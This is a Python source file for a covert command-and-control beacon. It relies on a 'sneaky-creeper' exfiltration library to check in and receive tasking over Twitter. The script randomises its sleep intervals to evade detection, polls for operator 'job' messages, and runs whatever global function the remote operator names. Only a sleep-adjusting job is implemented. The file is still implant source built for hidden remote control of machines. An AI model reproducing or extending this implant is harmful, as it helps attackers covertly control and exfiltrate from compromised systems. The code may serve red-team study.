#! /usr/bin/env python

import os
import sys
import string
import random
from time import sleep

# put sneaky-creeper on the path, then import it
basePath = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(basePath, 'sneaky-creeper'))
from sneakers import Exfil

uid = None # our UID

# actual sleep time will be randomly chosen between the following two
minSleepTime = 1 # minimum seconds to sleep between checkins
maxSleepTime = 5 # maximum seconds to sleep between checkins

# jobs we've done
jobs = []

channel = "twitter"
encoders = []

channelParams = {'sending': {
                 },

                 'receiving': {
                 }
                }

encoderParams = {}

def setUpFeed():
    """ Set up the sneaky-creeper comms channel object and return it """

    feed = Exfil(channel, encoders)
    feed.set_channel_params(channelParams)
    for enc, params in encoderParams.items():
        feed.set_encoder_params(enc, params)

    return feed

def sendMessage(msg):
    """ sends a generic 'message' packet on the feed """
    feed.send("message:{}:{}".format(uid, msg))

def checkForJobs(feed):
    """ check the feed for any jobs, then execute them """
    messages = feed.receive()
    for message in messages:
        # job message format is: "job:uid:jobName:jobId:jobArguments"
        if message.startswith("job:{}".format(uid)):
            print("WE GOT A JOB TA DO")
            global jobs

            [cmdType, msgUid, jobName, jobId, cmdString] = message.split(':', 4)

            # if we've already done this job, continue
            if jobId in jobs:
                print('nevermind, we already did this')
                continue

            # call the function with the name jobName
            globals()[jobName](cmdString)
            # maybe in a thread?

            # mark the job as done
            jobs.append(jobId)


def setSleep(cmdString):
    """ update the minimum and maximum sleep times """
    args = cmdString.split('-')
    # args should now contain [minTime, maxTime]
    try:
        global minSleepTime
        global maxSleepTime
        minSleepTime = int(args[0])
        maxSleepTime = int(args[1])
    except ValueError:
        # unable to parse the arguments
        sendMessage('unable to update sleep time')
        pass

if __name__ == "__main__":
    # set up our comms channel
    feed = setUpFeed()

    # generate a uid for ourselves
    uid = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(20)])
    # check in
    feed.send("checkin:{}".format(uid))

    while True:
        checkForJobs(feed)
        sleepTime = random.uniform(minSleepTime, maxSleepTime)
        print(sleepTime)
        sleep(sleepTime)
